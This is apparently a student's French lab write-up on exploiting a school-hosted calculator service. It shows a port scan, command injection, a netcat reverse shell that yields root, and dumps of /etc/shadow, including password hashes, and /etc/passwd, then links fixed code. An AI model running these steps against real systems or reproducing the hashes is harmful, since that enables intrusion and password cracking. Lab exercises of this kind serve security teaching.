# TP5 SECU : Exploit, pwn, fix

## Sommaire

- [TP5 SECU : Exploit, pwn, fix](#tp5-secu--exploit-pwn-fix)
  - [Sommaire](#sommaire)
  - [0. Setup](#0-setup)
  - [1. Reconnaissance](#1-reconnaissance)
  - [2. Exploit](#2-exploit)
  - [3. Reverse shell](#3-reverse-shell)
  - [4. Bonus : DOS](#4-bonus--dos)
  - [II. Remédiation](#ii-remédiation)

## 0. Setup

🌞 **Déterminer**

```bash
IP = 10.33.66.78
Port = 13337
```

➜ **On me dit à l'oreillette que cette app est actuellement hébergée au sein de l'école.**

🌞 **Scanner le réseau**

```bash
Nmap scan report for 10.33.66.78
Host is up (0.12s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
```

🦈 **tp5_nmap.pcapng**

🌞 **Connectez-vous au serveur**

```bash
2024-10-24 11:08:55 INFO Connexion réussie à 10.33.66.78:13337
2024-10-24 11:08:55 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
2024-10-24 11:08:59 INFO Message envoyé au serveur 10.33.66.78 : 1 + 1
```

## 2. Exploit

🌞 **Injecter du code serveur**

```bash
stan@Stanislass-MacBook-Pro-2 tp5-secu-2024 % python3 client.py
command : ls
'afs\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n'
```

## 3. Reverse shell

🌞 **Obtenez un reverse shell sur le serveur**

```bash
stan@Stanislass-MacBook-Pro-2 ~ % nc -lv 1111
bash: cannot set terminal process group (1229): Inappropriate ioctl for device
bash: no job control in this shell
[root@localhost /]# 
```

🌞 **Pwn**

```bash
[root@localhost /]# cat /etc/shadow    
root:$6$.8fzl//9C0M819BS$Sw1mrG49Md8cyNUn0Ai0vlthhzuSZpJ/XVfersVmgXDSBrTVchneIWHYHnT3mC/NutmPS03TneWAHihO0NXrj1::0:99999:7:::
bin:*:19820:0:99999:7:::
daemon:*:19820:0:99999:7:::
adm:*:19820:0:99999:7:::
lp:*:19820:0:99999:7:::
sync:*:19820:0:99999:7:::
shutdown:*:19820:0:99999:7:::
halt:*:19820:0:99999:7:::
mail:*:19820:0:99999:7:::
operator:*:19820:0:99999:7:::
games:*:19820:0:99999:7:::
ftp:*:19820:0:99999:7:::
nobody:*:19820:0:99999:7:::
systemd-coredump:!!:20010::::::
dbus:!!:20010::::::
tss:!!:20010::::::
sssd:!!:20010::::::
sshd:!!:20010::::::
chrony:!!:20010::::::
it4:$6$HTSBHGoZflJxXu9u$i54higNbS5p2zVOLWP6P33D39SyWRrEAOjzh97xRa15KzJU3jZfBi/XIPY3FKDoYoSvo1FrirBwNcgmEVpaPK/::0:99999:7:::
tcpdump:!!:20010::::::
```

```bash
[root@localhost /]# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/:/usr/sbin/nologin
sssd:x:998:996:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
chrony:x:997:995:chrony system user:/var/lib/chrony:/sbin/nologin
it4:x:1000:1000:it4:/home/it4:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
```

```bash
[root@localhost system]# sudo cat calc.service
[Unit]
Description=calc service

[Service]
Restart=always
ExecStart=/usr/bin/python3 /opt/calc/server.py

[Install]
WantedBy=multi-user.target
```

[server.py](./server.py)

```bash
[root@localhost system]# sudo cat auditd.service    
[Unit]
Description=Security Auditing Service
DefaultDependencies=no
## If auditd is sending or recieving remote logging, copy this file to
## /etc/systemd/system/auditd.service and comment out the first After and
## uncomment the second so that network-online.target is part of After.
## then comment the first Before and uncomment the second Before to remove
## sysinit.target from "Before".
After=local-fs.target systemd-tmpfiles-setup.service
##After=network-online.target local-fs.target systemd-tmpfiles-setup.service
Before=sysinit.target shutdown.target
##Before=shutdown.target
Conflicts=shutdown.target
RefuseManualStop=yes
ConditionKernelCommandLine=!audit=0
ConditionKernelCommandLine=!audit=off

Documentation=man:auditd(8) https://github.com/linux-audit/audit-documentation

[Service]
Type=forking
PIDFile=/run/auditd.pid
ExecStart=/sbin/auditd
## To not use augenrules, copy this file to /etc/systemd/system/auditd.service
## and comment/delete the next line and uncomment the auditctl line.
## NOTE: augenrules expect any rules to be added to /etc/audit/rules.d/
ExecStartPost=-/sbin/augenrules --load
#ExecStartPost=-/sbin/auditctl -R /etc/audit/audit.rules
# By default we don't clear the rules on exit. To enable this, uncomment
# the next line after copying the file to /etc/systemd/system/auditd.service
#ExecStopPost=/sbin/auditctl -R /etc/audit/audit-stop.rules
Restart=on-failure
# Do not restart for intentional exits. See EXIT CODES section in auditd(8).
RestartPreventExitStatus=2 4 6

### Security Settings ###
MemoryDenyWriteExecute=true
LockPersonality=true
# The following control prevents rules on /proc so its off by default
#ProtectControlGroups=true
ProtectKernelModules=true
RestrictRealtime=true

[Install]
WantedBy=multi-user.target
```

[auditd](./auditd)

## II. Remédiation

🌞 **Proposer une remédiation dév**

[server_fixed.py](./server_fixed.py)

[client_fixed.py](./client_fixed.py)
